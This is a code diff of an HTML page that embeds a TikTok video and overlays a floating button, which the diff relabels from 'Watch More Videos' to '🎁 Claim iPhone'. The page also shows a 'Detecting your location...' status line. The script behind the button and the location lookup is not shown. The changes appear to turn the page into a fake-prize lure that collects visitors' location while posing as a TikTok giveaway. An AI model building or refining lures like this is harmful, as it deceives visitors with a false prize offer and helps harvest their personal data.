@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>TikTok Style Claim</title>
+  <title>TikTok Video Claim</title>
   <style>
     body, html {
       margin: 0;
       padding: 0;
       height: 100%;
       width: 100%;
-      font-family: Arial, sans-serif;
       background: black;
+      font-family: Arial, sans-serif;
       overflow: hidden;
     }
 
@@ -19,16 +19,18 @@
       position: relative;
       height: 100vh;
       width: 100vw;
-      overflow: hidden;
     }
 
-    video {
-      height: 100%;
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
       width: 100%;
-      object-fit: cover;
+      height: 100%;
+      border: none;
     }
 
-    /* Floating Button like TikTok */
+    /* Floating Claim Button */
     .claim-btn {
       position: absolute;
       bottom: 80px;
@@ -44,6 +46,7 @@
       cursor: pointer;
       box-shadow: 0 4px 15px rgba(0,0,0,0.3);
       transition: background 0.3s;
+      z-index: 10;
     }
     .claim-btn:hover {
       background: #d40045;
@@ -58,6 +61,7 @@
       color: white;
       font-size: 14px;
       text-shadow: 0 2px 6px rgba(0,0,0,0.8);
+      z-index: 10;
     }
 
     #locationDisplay {
@@ -69,14 +73,17 @@
 </head>
 <body>
   <div class="video-container">
-    <!-- Background TikTok-like video -->
-    <video autoplay muted loop playsinline>
-      <source src="https://www.tiktok.com/@halalrichh/video/7498957987864694038" type="video/mp4">
-      Your browser does not support video playback.
-    </video>
+    <!-- Embed TikTok video -->
+    <iframe 
+      src="https://www.tiktok.com/embed/7390033908571622687" 
+      allowfullscreen
+      allow="autoplay; encrypted-media; picture-in-picture"
+      scrolling="no"
+      frameborder="0">
+    </iframe>
 
     <!-- Floating Claim Button -->
-    <button class="claim-btn" onclick="claimReward()">Watch More Videos</button>
+    <button class="claim-btn" onclick="claimReward()">🎁 Claim iPhone</button>
 
     <!-- Location + Status -->
     <p id="locationDisplay">Detecting your location...</p>
@@ -135,5 +142,3 @@
   </script>
 </body>
 </html>
-
-
